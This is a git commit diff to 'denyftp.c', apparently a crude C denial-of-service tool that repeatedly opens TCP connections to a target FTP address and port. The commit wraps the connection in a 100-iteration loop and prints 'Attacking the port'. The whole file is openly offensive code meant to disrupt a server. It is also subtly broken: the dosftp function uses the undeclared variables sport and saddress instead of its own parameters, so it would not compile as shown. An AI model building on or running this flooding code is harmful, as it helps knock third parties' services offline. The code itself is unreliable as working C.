23b88855ffb16fda7123c8fa57989c0812e7fdc0
mowlkmorok <65051191+mowlkmorok@users.noreply.github.com>
2022-07-09 23:22:10 -0300

    Update denyftp.c

--- denyftp/denyftp.c
+++ denyftp/denyftp.c
@@ -1,5 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <sys/socket.h>
+#include <netdb.h>
 
 
 void dosftp(int s_port, char *s_address);
@@ -7,6 +9,7 @@ void dosftp(int s_port, char *s_address);
 
 int main(int argc, char *argv[])
 {
+	int x = 0;
 	char *saddress;
 	saddress = argv[2];
 	
@@ -15,10 +18,15 @@ int main(int argc, char *argv[])
 	sport = atoi(argv[1]);
 
 //	printf("port %d address: %s\n", sport,saddress);
+	
+	while(x < 100)
+	{	
+		dosftp(sport,saddress);
+		x++;
+	}
 
-	dosftp(sport,saddress);	
 		
-
+	return 0;
 }
 
 
@@ -43,23 +51,26 @@ void dosftp(int s_port, char *s_address)
 	
 	
 	mysocket = socket(AF_INET, SOCK_STREAM, 0);
-	if(mysocket < 0)
+	if(mysocket < 0){
 		printf("Error in connection!\n");
 		exit(1);
-		
+	}
 		
 	goal.sin_family = AF_INET;
 	goal.sin_port = htons(sport);
-	goal.sin_address.s_addr = inet_addr(saddress);
+	goal.sin_addr.s_addr = inet_addr(saddress);
 	bzero(&(goal.sin_zero),8);
 	
 	
-	myconnect = connect(mysocket(struct sockaddr *)&goal, );
-	if(myconnect < 0)
+	myconnect = connect(mysocket,(struct sockaddr *)&goal, sizeof(goal));
+	if(myconnect < 0){
 		printf("Error in connection!\n");
+		close(mysocket);
 		exit(1);
-	
+	}
+	printf("Attacking the port %d\n", sport);
 
+	
 //---	FIN SOCKET ----------------------------------------------------------
 
 }
